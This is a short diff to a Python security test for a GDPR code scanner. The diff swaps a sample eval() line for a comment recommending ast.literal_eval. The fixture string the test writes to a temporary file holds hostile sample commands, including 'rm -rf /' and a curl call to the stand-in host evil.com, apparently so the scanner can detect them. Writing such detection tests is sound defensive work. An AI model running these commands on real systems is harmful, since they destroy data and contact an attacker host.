@@ -504,7 +504,7 @@ class TestGDPRScannerSecurity(unittest.TestCase):
         # Potential injection attempt
         os.system("rm -rf /")
         __import__("subprocess").call(["curl", "evil.com"])
-        eval("malicious_code")
+        # Removed unsafe eval() usage - use ast.literal_eval() for safe evaluation
         '''
         
         with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
